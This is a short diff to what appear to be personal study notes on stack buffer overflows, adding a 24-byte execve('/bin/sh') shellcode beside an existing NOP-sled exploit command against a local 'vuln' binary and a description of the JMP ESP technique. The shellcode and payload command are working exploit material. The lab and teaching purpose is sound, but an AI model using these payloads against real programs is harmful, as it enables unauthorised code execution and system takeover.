@@ -58,6 +58,9 @@ Author: Gabriel Maciá
    With NOP Sled
 	   ./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`'
 
+	ShellCode (24 bytes) (from exercises/assembly/shell): 
+		"\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
+
 5) JMP ESP technique:  www.exploit-db.com/papers/13232
    Avoids having to know the exact position of the buffer. It is similar to the previous one, but in this case we write the payload after the savedEIP and in the savedEIP we call a JMP $ESP instruction.
        
